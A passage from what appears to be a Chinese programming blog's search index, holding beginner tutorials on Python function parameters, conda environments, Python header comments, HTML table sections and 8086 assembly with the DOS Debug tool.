多次执行没有问题 ","permalink":"/posts/python-func-par/","summary":"位置参数 位置参数是指定了多少参数，就必须输入多少参数，否则就会报错。也可以把位置参数理解为必须参数，如果没有输入同等的参数，就会报错，比如下面的代码，计算两个数的乘积。\ndef power(x,y): return x * y power(2,5) # 10 power(2) #报错 默认参数 默认参数指的是可以给一个参数设置一个默认值，如果用户没有输入这个参数，那么在函数内部就会用这个参数设置的默认值进行计算，比如说下面的函数是返回两个数的乘积，如果用户没有输入第二个数，就默认为数值'2\u0026rsquo;。\ndef power(x,y=2): return x * y power(2,5) # 10 power(2) # 4 可变参数 可变参数是定义函数的时候不确定函数有多少个值，但是都会去接收进行计算，在函数内部是把所有的参数组合成一个不可变的元组数列。\n可以把可变参数理解为函数参数的个数是可以不固定的，比如计算用户输入的所有数值之和，此时的参数是不可控的，这种情况就可以使用可变参数，比如下面的代码是计算用户输入的所有数值之和。\n# 可变参数通过参数名前输入一个\u0026#39;*\u0026#39;号，标记为这是一个可变参数 def power(*num): sum = 0 for x in num: sum += x return sum power(2,5) # 7 power(2) # 2 power(2,5,6,7,8,9,10,22) # 69 关键字参数 关键字参数允许传入任意个含参数名的参数与值，并在内部自动组成一个dict类型的数据，比如我需要处理一些注册的信息，但是只有名字是必须的，其他的都是可选的，你可以把关键字参数理解为以name=value形式的这样的参数的个数是不固定的参数。\n比如下面的代码就是处理一个注册的信息，如果有人填了选填的部分，就把参数传入到函数进行处理。\n# 可变参数通过参数名前输入一个\u0026#39;**\u0026#39;号，标记为这是一个关键字参数，并传入name=value形式的参数 def power(name,**other): print(\u0026#39;name:{}, other:{}\u0026#39;.format(name,other)) power(\u0026#39;trick\u0026#39;, a=1,b=2) # name:trick, other:{\u0026#39;a\u0026#39;: 1, \u0026#39;b\u0026#39;: 2} 命名关键字参数 命名关键字参数是对于关键字参数的补充，当定义关键字参数的时候我们是没有办法对关键字参数可控的，而命名关键字参数就可以控制关键字参数的名字以及接收关键字的个数，比如下面的代码只接收\u0026rsquo;city\u0026rsquo;和\u0026rsquo;email\u0026rsquo;两个关键字参数。","title":"Python函数参数"},{"content":"Anaconda是什么？ Anaconda可以理解为Python的软件发行版，可以用来管理包、环境，但是Anaconda主要针对于数据科学。\nAnaconda附带了conda、Python以及150和科学有关的包及其依赖包，其中由conda负责管理包和环境，由conda安装的包会自动去安装依赖包，所以只知道需要安装的包叫什么名字，而不用去管这个包依赖的有哪些包。\nConda和pip的区别在于都是包管理器，但是conda还提供了环境管理，什么是环境管理呢？\n你可以把它想象为虚拟机，每个虚拟机都有一个独立的环境，互相可以安装不同版本的软件，比如说我虚拟机1安装word2007，虚拟机2安装word2016。\nAnaconda安装 首先需要到官网下载，然后根据自身的系统选择相应的版本进行安装，安装过后进入到终端就可以使用conda进行管理包和管理环境。\n但是第一次下载过后建议升级更新，因为从官网下载的软件包很有可能不是最新的，所以最好进行一次更新\nconda upgrade --all Anaconda 包管理命令 conda提供了一些基本的包管理命令供用户使用：\nconda list ---查看已安装的包列表 conda install package_name ---安装指定的包，可以同时安装多个包，包名之间以逗号分隔开。 conda install package_name=version ---安装指定版本的包，包后面跟随版本，适用于多个包安装 conda remove package_name ---卸载已经安装的包 conda search search_name ---搜索包 Anaconda 环境管理命令 假如你有这样的一个问题，你本机需要安装python2对老的代码进行运行，但是你又会用python3对新的代码进行运行，那这个时候就会很麻烦了，你会下载两个版本的python，并在系统中设置相应的命令别名，那如果还有其他的包呢？是不是都会为每一个包设置一个别名？所以环境管理就有很大的作用了。\n你可以把环境想象为虚拟机，每个虚拟机之间互相影响，可以安装不同的版本的包，你可以通过下面的代码来创建一个环境，并默认安装python为最新的版本：\nconda create -n env_name env_name为你创建环境的名字 那如果我要安装其他的包呢？有两个办法，一个是通过下面的方式，还有一个就是进入到环境后通过conda install package_name安装：\nconda create -n env_name package_name,... 在环境名后面跟着你需要安装的包名，可以多个 那如果我需要指定python版本呢？通过在环境名字后加上python=2来指定版本：\nconda create -n env_name python=2 安装好环境过后，我们可以通过下面的代码来查看目前已经创建的所有环境：\nconda env list 现在安装好后可以进入环境中了，通过下面的代码进入环境，当你成功进入环境过后，你会看见终端提示符中有环境的名称(env_name) ~ $\nUinx/Linux/Mac: source activate env_name Windows: activate env_name 退出当前的环境用下面的代码：\nUinx/Linux/Mac: source deactivate Windows: deactivate 删除环境：\nconda env remove -n env_name env_name为你需要删除的环境名称 导出和加载 conda提供了一个导出当前环境配置和导入的功能，这样当别人拿着我们代码的时候就不用考虑依赖包和版本的问题就直接可以使用了。\n导出命令：\nconda env export \u0026gt; filename.yaml 其中filename为你需要导出环境配置的文件名。 导入命令：\nconda env create -f filename.yaml 其中filename为你需要导入的环境配置的文件名 ","permalink":"/posts/anaconda/","summary":"Anaconda是什么？ Anaconda可以理解为Python的软件发行版，可以用来管理包、环境，但是Anaconda主要针对于数据科学。\nAnaconda附带了conda、Python以及150和科学有关的包及其依赖包，其中由conda负责管理包和环境，由conda安装的包会自动去安装依赖包，所以只知道需要安装的包叫什么名字，而不用去管这个包依赖的有哪些包。\nConda和pip的区别在于都是包管理器，但是conda还提供了环境管理，什么是环境管理呢？\n你可以把它想象为虚拟机，每个虚拟机都有一个独立的环境，互相可以安装不同版本的软件，比如说我虚拟机1安装word2007，虚拟机2安装word2016。\nAnaconda安装 首先需要到官网下载，然后根据自身的系统选择相应的版本进行安装，安装过后进入到终端就可以使用conda进行管理包和管理环境。\n但是第一次下载过后建议升级更新，因为从官网下载的软件包很有可能不是最新的，所以最好进行一次更新\nconda upgrade --all Anaconda 包管理命令 conda提供了一些基本的包管理命令供用户使用：\nconda list ---查看已安装的包列表 conda install package_name ---安装指定的包，可以同时安装多个包，包名之间以逗号分隔开。 conda install package_name=version ---安装指定版本的包，包后面跟随版本，适用于多个包安装 conda remove package_name ---卸载已经安装的包 conda search search_name ---搜索包 Anaconda 环境管理命令 假如你有这样的一个问题，你本机需要安装python2对老的代码进行运行，但是你又会用python3对新的代码进行运行，那这个时候就会很麻烦了，你会下载两个版本的python，并在系统中设置相应的命令别名，那如果还有其他的包呢？是不是都会为每一个包设置一个别名？所以环境管理就有很大的作用了。\n你可以把环境想象为虚拟机，每个虚拟机之间互相影响，可以安装不同的版本的包，你可以通过下面的代码来创建一个环境，并默认安装python为最新的版本：\nconda create -n env_name env_name为你创建环境的名字 那如果我要安装其他的包呢？有两个办法，一个是通过下面的方式，还有一个就是进入到环境后通过conda install package_name安装：\nconda create -n env_name package_name,... 在环境名后面跟着你需要安装的包名，可以多个 那如果我需要指定python版本呢？通过在环境名字后加上python=2来指定版本：\nconda create -n env_name python=2 安装好环境过后，我们可以通过下面的代码来查看目前已经创建的所有环境：\nconda env list 现在安装好后可以进入环境中了，通过下面的代码进入环境，当你成功进入环境过后，你会看见终端提示符中有环境的名称(env_name) ~ $\nUinx/Linux/Mac: source activate env_name Windows: activate env_name 退出当前的环境用下面的代码：","title":"Anaconda入门教程"},{"content":"#!/usr/bin/env python3 # -*- coding: utf-8 -*- 在刚开始学习Python的时候遇到了上面的疑问，这些疑问感觉很奇怪，应为对于Nodejs这样的语言，这些问题是不会存在的，后来了解了一下关于这些疑问，觉得还是非常有用。\n比如在Nodejs当中我用高版本新特性的Node写了一段程序，我只能在文件中说明这是使用什么版本的Node，但是如果用户无法注意到这个问题，很有可能他电脑里面使用的是低版本的Node，可能就会发生错误，而Python如果这样声明了过后就会解决掉这个问题。\n默认脚本语言解释器 一般在python文件中第一行都有一个注释，上面指定了这个脚本语言需要用什么解释器来解释，Nodejs需要用Node解释器解释，perl需要用perl解释，python当然也需要用python脚本解释器来解释了。\n一般第一行会存在两种格式：\n!/usr/bin/python !/usr/bin/env python3或者2 这两种方式都是可行的，但是会存在一种问题，第一种写法的作用就是不管你在哪一台Linux机器上面执行这个python文件，都只会调用/usr/bin/python脚本解释器，如果在这个路径中没有找到python解释器将不能得到执行。\n而第二种方式是利用的Linux系统的特性，在Linux系统特性下面会存在一个env，它保存着系统的环境变量，就相当于windows下的PATH。而像第二种设置方式去设置的话，系统会首先找到/usr/bin/env文件，然后再去寻找python3或2可执行程序来解释脚本。\n编码执行注释 在Python中，默认的编码为ASCII作为标准编码，那么如何使用其他编码在源文件内进行中文输入呢？Python官方定义一个注释的格式，关于这份文档可以到官网查看。\n# -*- coding: utf-8 -*- ","permalink":"/posts/python-coding-settings/","summary":"#!/usr/bin/env python3 # -*- coding: utf-8 -*- 在刚开始学习Python的时候遇到了上面的疑问，这些疑问感觉很奇怪，应为对于Nodejs这样的语言，这些问题是不会存在的，后来了解了一下关于这些疑问，觉得还是非常有用。\n比如在Nodejs当中我用高版本新特性的Node写了一段程序，我只能在文件中说明这是使用什么版本的Node，但是如果用户无法注意到这个问题，很有可能他电脑里面使用的是低版本的Node，可能就会发生错误，而Python如果这样声明了过后就会解决掉这个问题。\n默认脚本语言解释器 一般在python文件中第一行都有一个注释，上面指定了这个脚本语言需要用什么解释器来解释，Nodejs需要用Node解释器解释，perl需要用perl解释，python当然也需要用python脚本解释器来解释了。\n一般第一行会存在两种格式：\n!/usr/bin/python !/usr/bin/env python3或者2 这两种方式都是可行的，但是会存在一种问题，第一种写法的作用就是不管你在哪一台Linux机器上面执行这个python文件，都只会调用/usr/bin/python脚本解释器，如果在这个路径中没有找到python解释器将不能得到执行。\n而第二种方式是利用的Linux系统的特性，在Linux系统特性下面会存在一个env，它保存着系统的环境变量，就相当于windows下的PATH。而像第二种设置方式去设置的话，系统会首先找到/usr/bin/env文件，然后再去寻找python3或2可执行程序来解释脚本。\n编码执行注释 在Python中，默认的编码为ASCII作为标准编码，那么如何使用其他编码在源文件内进行中文输入呢？Python官方定义一个注释的格式，关于这份文档可以到官网查看。\n# -*- coding: utf-8 -*- ","title":"Python头部注释"},{"content":"在HTML设计数据展示的时候会经常使用到HTML表格来展示数据，但是如果数据量过大，就导致表格显示慢，因为在HTML中，表格的显示是需要等待内部所有数据都加载完毕才会显示整个表格，这样对用户体验很不好，比如下面这样：\n\u0026lt;table border=\u0026#34;10px\u0026#34; width=\u0026#34;500px\u0026#34;\u0026gt; \u0026lt;caption\u0026gt;test\u0026lt;/caption\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; 在html中，有三种标记专门针对html表格进行优化结构化，而不虚要向上面的表格那样需要等待全部数据加载完毕后才能显示表格，而结构化的好处就是当表格加载完一部分就显示完一部分，这三个表示表格结构化的标签为：\nthead tbody tfoot 在使用过程中，只需要把这三个标签相应的行包含就可以了，使用后对代码的理解也会更加方便，需要注意的是，这三个标签是包含在table标签内的，并且它们的顺序是可以颠倒的，但是它们出现的位置始终是表头、表主体、表脚。\n比如向下面这样：\n\u0026lt;table border=\u0026#34;10px\u0026#34; width=\u0026#34;500px\u0026#34;\u0026gt; \u0026lt;caption\u0026gt;test\u0026lt;/caption\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/tbody\u0026gt; \u0026lt;tfoot\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/tfoot\u0026gt; \u0026lt;/table\u0026gt; ","permalink":"/posts/html-table-preloaded/","summary":"在HTML设计数据展示的时候会经常使用到HTML表格来展示数据，但是如果数据量过大，就导致表格显示慢，因为在HTML中，表格的显示是需要等待内部所有数据都加载完毕才会显示整个表格，这样对用户体验很不好，比如下面这样：\n\u0026lt;table border=\u0026#34;10px\u0026#34; width=\u0026#34;500px\u0026#34;\u0026gt; \u0026lt;caption\u0026gt;test\u0026lt;/caption\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; 在html中，有三种标记专门针对html表格进行优化结构化，而不虚要向上面的表格那样需要等待全部数据加载完毕后才能显示表格，而结构化的好处就是当表格加载完一部分就显示完一部分，这三个表示表格结构化的标签为：\nthead tbody tfoot 在使用过程中，只需要把这三个标签相应的行包含就可以了，使用后对代码的理解也会更加方便，需要注意的是，这三个标签是包含在table标签内的，并且它们的顺序是可以颠倒的，但是它们出现的位置始终是表头、表主体、表脚。\n比如向下面这样：\n\u0026lt;table border=\u0026#34;10px\u0026#34; width=\u0026#34;500px\u0026#34;\u0026gt; \u0026lt;caption\u0026gt;test\u0026lt;/caption\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;加载本地数据\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;远程加载数据\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/tbody\u0026gt; \u0026lt;tfoot\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;等待远程加载数据后计算数据\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/tfoot\u0026gt; \u0026lt;/table\u0026gt; ","title":"HTML表格的加载优化"},{"content":"内存中字的储存 在8086CPU中，寄存器为16位，可以储存一个字(1Word=2Byte)，拿ax来说，低8位放在al中，高8位放在ah中。\n在内存单元一个内存单元只能存储一个字节，那么如果存储一个字型数据就会用到两个内存单元，低8位放在低地址当中，高8位放在高地址当中，比如下图中，储存了两个字型数据，一个是4E20H，一个是0012H，它们的存放数据大概如下：\n而当连续两个内存单元储存的是一个字型数据的时候，可以将这字型数据的起始地址称为N地址字单元，比如00001内存单元和00002内存单元，可以直接称为00001地址字单元。\n数据的读写 在第二章中写到如何操作CPU的执行指令，让内存中的数据当作指令还是数据都取决于程序员，当CS和IP指向的地址则当作指令执行，那读取数据也需要由段地址和偏移地址组成。\n8086CPU中，数据地址的段地址由段寄存器DS来指定，并且不能直接将数据送入DS段寄存器，只能通过其他寄存器来传送给段寄存器DS（这是8086CPU的硬件设计，只需要知道就可以了），那偏移地址呢？\n先来看看下面的代码，下面的代码是通过ax寄存器把内存单元2000H段地址传送给DS，然后读取内存单元2000段中的0001单元：\nmov bx,2000H mov ds,bx mov al,[0001H] 偏移地址是由程序员手动输入的，当编译器看见[]的时候，会自动把段寄存器DS中的值与[]号中数据进行合成为一个20位的物理地址，然后读取这个物理地址中的数据。\n那么如何把寄存器中的数据写入内存中呢？只需要将两个位置相关换一下，就可以了，比如下面代码，把ax的低位寄存器al中的12H数据写入内存2000段中的0001单元。\nmov bx,2000H mov ds,bx mov al,12H mov [0001H],al 字型数据传送 8086CPU是16位架构，那么意味着一次性可以传输16位数据，上面操作的都是8位数据，也可以传输16位数据，只需要给出16位寄存器的名字就可以传送了，但是16位寄存器分两个内存单元储存，一个内存单元只能储存8位数据，比如储存一个8E20H数据到2000:0000内存单元中，那么20H储存在2000:0000中，而8E储存在2000:0001中。\nCPU提供的栈以及机制 栈是一种特殊方式访问的内存单元，那么它有什么用呢？以后会慢慢来说到，在这里只是先对栈空间有一个大概的认识，栈的特殊性在于后进先出，英文缩写为LIFO(Last in First Out)。\n这个是什么意思呢？可以把栈看作一个放书的盒子，依次放3本书进去的时候，需要取出放进去的第一本书的时候，就会先把上面的两本书依次拿出来，才能取到放进去的第一本书。\n当需要取出哪一本书的时候，我们总会先拿出最上面的那一本书，不然无法拿到需要的书，而每取出一本书，下一本总是在最上面。\n在程序化的角度上来说是应该有一个标记，这个标记中指向最上面的书，也就是栈顶，如下图所示：\n现今的CPU中都有栈的设计，包含8086，既然有栈的设计，肯定也有对栈访问的指令，其中最基本的就是PUSH（入栈）和POP（出栈），比如push ax代表将ax寄存器的数据送入栈中，入栈和出栈都是字型数据操作，比如下图是一个操作栈的例子：\n虽然说现在可以操作栈了，但是有两个疑问：\n栈中的数据存储在哪里？ 上面说到，有一个标记，总是指向栈顶，那这个栈顶在哪里？ 上面两个问题可以归于一个，其实栈也是在内存单元中，只是它是一段特殊访问方式的空间，那既然是内存单元，那可能也有类似与段寄存器和偏移寄存器这样的寄存器来指向栈，它们就是SS:SP。\nSS存放栈的段地址，而SP存放栈的偏移地址，SS:SP在任意时刻指向的是栈顶，我们可以通过修改SS和SP来指定哪一段内存单元为栈，那么现在就可以很好的解释push和pop指令的工作方式，比如push ax的执行，由以下两部分完成：\nSP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶起前面的单元为新栈顶。 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶。 上面的步骤可以用下图来表示：\n从图中可以看出，8086CPU中，入栈时，由栈顶高地址向低地址增长，而出栈就是由低地址到高地址增长。\n栈顶超界 可以想象一下，当栈空间为2000H:0000H-2000H:000FH的16个内存单元时，那么当栈为空，栈顶在0010H位置，如果这时我们操作出栈，那么SP应该+2，即为0012H，那如果入栈低于了20000H这个内存空间的时候呢？这两种情况都超出了栈的范围，就会覆盖相应的内存单元的数据，比如在下面两个图中，分别对出栈和入栈都演示了一个超界的情况：\n在内存单元中，可能存放数据，代码，也有可能存放其他应用的数据代码等，如果超出了就会出现其他未知的问题，在8086CPU中，并没有什么机制来预防这样的问题，应为8086CPU只需要关注栈顶在哪里，并不会关注栈的空间有多大，所以我们需要特别注意，这是非常危险的一个操作。\n","permalink":"/posts/learning-assembly-4/","summary":"内存中字的储存 在8086CPU中，寄存器为16位，可以储存一个字(1Word=2Byte)，拿ax来说，低8位放在al中，高8位放在ah中。\n在内存单元一个内存单元只能存储一个字节，那么如果存储一个字型数据就会用到两个内存单元，低8位放在低地址当中，高8位放在高地址当中，比如下图中，储存了两个字型数据，一个是4E20H，一个是0012H，它们的存放数据大概如下：\n而当连续两个内存单元储存的是一个字型数据的时候，可以将这字型数据的起始地址称为N地址字单元，比如00001内存单元和00002内存单元，可以直接称为00001地址字单元。\n数据的读写 在第二章中写到如何操作CPU的执行指令，让内存中的数据当作指令还是数据都取决于程序员，当CS和IP指向的地址则当作指令执行，那读取数据也需要由段地址和偏移地址组成。\n8086CPU中，数据地址的段地址由段寄存器DS来指定，并且不能直接将数据送入DS段寄存器，只能通过其他寄存器来传送给段寄存器DS（这是8086CPU的硬件设计，只需要知道就可以了），那偏移地址呢？\n先来看看下面的代码，下面的代码是通过ax寄存器把内存单元2000H段地址传送给DS，然后读取内存单元2000段中的0001单元：\nmov bx,2000H mov ds,bx mov al,[0001H] 偏移地址是由程序员手动输入的，当编译器看见[]的时候，会自动把段寄存器DS中的值与[]号中数据进行合成为一个20位的物理地址，然后读取这个物理地址中的数据。\n那么如何把寄存器中的数据写入内存中呢？只需要将两个位置相关换一下，就可以了，比如下面代码，把ax的低位寄存器al中的12H数据写入内存2000段中的0001单元。\nmov bx,2000H mov ds,bx mov al,12H mov [0001H],al 字型数据传送 8086CPU是16位架构，那么意味着一次性可以传输16位数据，上面操作的都是8位数据，也可以传输16位数据，只需要给出16位寄存器的名字就可以传送了，但是16位寄存器分两个内存单元储存，一个内存单元只能储存8位数据，比如储存一个8E20H数据到2000:0000内存单元中，那么20H储存在2000:0000中，而8E储存在2000:0001中。\nCPU提供的栈以及机制 栈是一种特殊方式访问的内存单元，那么它有什么用呢？以后会慢慢来说到，在这里只是先对栈空间有一个大概的认识，栈的特殊性在于后进先出，英文缩写为LIFO(Last in First Out)。\n这个是什么意思呢？可以把栈看作一个放书的盒子，依次放3本书进去的时候，需要取出放进去的第一本书的时候，就会先把上面的两本书依次拿出来，才能取到放进去的第一本书。\n当需要取出哪一本书的时候，我们总会先拿出最上面的那一本书，不然无法拿到需要的书，而每取出一本书，下一本总是在最上面。\n在程序化的角度上来说是应该有一个标记，这个标记中指向最上面的书，也就是栈顶，如下图所示：\n现今的CPU中都有栈的设计，包含8086，既然有栈的设计，肯定也有对栈访问的指令，其中最基本的就是PUSH（入栈）和POP（出栈），比如push ax代表将ax寄存器的数据送入栈中，入栈和出栈都是字型数据操作，比如下图是一个操作栈的例子：\n虽然说现在可以操作栈了，但是有两个疑问：\n栈中的数据存储在哪里？ 上面说到，有一个标记，总是指向栈顶，那这个栈顶在哪里？ 上面两个问题可以归于一个，其实栈也是在内存单元中，只是它是一段特殊访问方式的空间，那既然是内存单元，那可能也有类似与段寄存器和偏移寄存器这样的寄存器来指向栈，它们就是SS:SP。\nSS存放栈的段地址，而SP存放栈的偏移地址，SS:SP在任意时刻指向的是栈顶，我们可以通过修改SS和SP来指定哪一段内存单元为栈，那么现在就可以很好的解释push和pop指令的工作方式，比如push ax的执行，由以下两部分完成：\nSP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶起前面的单元为新栈顶。 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶。 上面的步骤可以用下图来表示：\n从图中可以看出，8086CPU中，入栈时，由栈顶高地址向低地址增长，而出栈就是由低地址到高地址增长。\n栈顶超界 可以想象一下，当栈空间为2000H:0000H-2000H:000FH的16个内存单元时，那么当栈为空，栈顶在0010H位置，如果这时我们操作出栈，那么SP应该+2，即为0012H，那如果入栈低于了20000H这个内存空间的时候呢？这两种情况都超出了栈的范围，就会覆盖相应的内存单元的数据，比如在下面两个图中，分别对出栈和入栈都演示了一个超界的情况：\n在内存单元中，可能存放数据，代码，也有可能存放其他应用的数据代码等，如果超出了就会出现其他未知的问题，在8086CPU中，并没有什么机制来预防这样的问题，应为8086CPU只需要关注栈顶在哪里，并不会关注栈的空间有多大，所以我们需要特别注意，这是非常危险的一个操作。","title":"汇编语言学习笔记（四）：寄存器[内存访问]"},{"content":"什么是Debug？Debug是DOS、Windows提供的8086程序调试工具，可以查看CPU各种寄存器的内容，内存情况和机器码级跟踪程序的运行。\nDebug一共有20多个命令，但我们在目前为止会使用到Debug的6个命令：\nR命令：查看、改变寄存器的内容 D命令：查看内存中的内容 E命令：改写内存中的内容 U命令：将内存中的机器指令翻译成汇编指令 T命令：执行一条机器指令 A命令：以汇编指令的格式向内存中写入一条机器指令 Windows下的Debug 在Windows下自带提供了Debug，可以直接通过Window提供的DOS进入到Debug，可以通过开始命令，输入cmd然后进入到DOS界面后直接输入Debug后就进行Debug程序了。\nMac下的Debug 在Mac下，你需要通过Boxer这个程序来模拟DOS环境，打开后类似于这样的界面：\n点击Open a DOS prompt后就会弹出如下的界面，可以在这个环境下使用任何的DOS界面：\n但是这个DOS环境只包含了最基础的DOS环境，所以这个DOS环境是不带Debug程序的，你需要下载一个Debug程序或者下载由我提供的一个学习汇编需要的程序包，然后解压后把这个文件夹拖放进DOS窗口后，你就会看见Boxer提供的DOS环境会自动把这个目录加载成C盘，这样就可以正常使用Debug程序了，类似于下图这样：\n进入界面后，你会看见一个\u0026quot;-\u0026ldquo;后面跟着闪烁的下划线，说明已经进入Debug。\nR命令 R命令有两个作用：\n查看当前CPU的各个寄存器状态、以及当前CS、IP指向的代码以及机器指令翻译后的汇编指令。 修改各个寄存器的内容 输入r后，会返回当前CPU的各个寄存器状态，就如下图这样：\n如果需要修改某个寄存器的内容，可以通过r命令后跟一个寄存器的命令，比如r ax，输入后会返回一个ax当前寄存器的内容，然后会有一个提示符:等待输入，比如下图中，通过r ax命令设置ax的内容为1000H：\nD命令 通过下面的格式可以查看需要的内容中的内容：\nd 段地址:偏移地址 比如下图用d命令查看内容20000H处的内容：\n返回的内容中包含了三个显示部分：\n第一部分位于最左边类似于2000:0000，是每行开始的第一个内存单元的段地址和偏移地址。 第二部分位于中间的十六进制编码，是开始部分的内存单元一直显示128个内存单元的内容，而每行等于16个字节，注意在每行在第八个内存单元的后面会有一个-来分割，有利于我们辨识。 第三部分位于最右边，是每个内存单元中的数据可以对应显示的ASCII，如果没有对应的ASCII码，就会用.代替。 还有一种限制D命令输出的方式，可以通过使用结束偏移地址来限制D命令的返回结果，它的格式为：\nd 段地址:偏移地址 结束偏移地址 比如下图中只需要返回内存地址为2000:0000到2000:0009的十个内存单元的内容：\nE命令 e 段地址:偏移地址 可以通过E命令来改写内存中的内容，不管是汇编指令还是数据。\n通过E命令可以连续更改也可以更改一个内存单元，当修改指定内存单元的内容时，会把当前内存单元的内容显示出来，然后用一个.号连接需要写入的数据，比如需要修改内存单元20000H的内容为10，然后再用d命令查看修改后的内容：\n当然也可以连续修改指定内存单元后的连续内存单元中的内容，只需要在输入需要写入的内存单元后按空格间，会自动跳到下一个内存单元进行修改，直到按回车键，就会写入内存：\nU命令 u命令会将某一段内存单元中的内容翻译成汇编指令，并返回16个内存单元的内容，返回的内容中包含三部分：\n每一条机器指令的地址 对应的机器指令 对应的汇编指令 比如查看内存单元2000:0000的数据，并翻译成汇编指令：\n当然也可以限制返回的内容，比如下面返回内存单元2000:0000到内存单元2000:0009的汇编指令：\n这里需要注意的是在计算机中储存在内存单元中的不管是数据还是代码，都是以二进制形式储存的，所以是代码还是数据，得看程序员怎么去控制。\nT命令 T命令是执行当前CS和IP指向的内存单元中的汇编指令，执行后IP自动增加代码长度并正确的指向到下一个代码的内存单元：\nA命令 以汇编指令的方式写入到内存单元，格式为：\na 段地址:偏移地址 当指定修改某一个内存单元的内容时，会显示出当前修改的内存单元地址，并等待输入汇编指令，当输入完成后会自动跳到上一条代码长度后的内存单元继续等待输入，如果不想继续写入汇编指令，按回车键就结束写入。\n比如下图中，通过在内存单元20000H处以汇编指令形式写入：\nmov ax,20 并通过u命令查看内存单元20000H处是否写入成功：\n并且再通过r命令查看当前AX寄存器的内容，然后修改CS和IP寄存器，让CPU代码指针指向20000H处\n然后用t命令执行，再次查看AX寄存器的结果：\n","permalink":"/posts/learning-assembly-3/","summary":"什么是Debug？Debug是DOS、Windows提供的8086程序调试工具，可以查看CPU各种寄存器的内容，内存情况和机器码级跟踪程序的运行。\nDebug一共有20多个命令，但我们在目前为止会使用到Debug的6个命令：\nR命令：查看、改变寄存器的内容 D命令：查看内存中的内容 E命令：改写内存中的内容 U命令：将内存中的机器指令翻译成汇编指令 T命令：执行一条机器指令 A命令：以汇编指令的格式向内存中写入一条机器指令 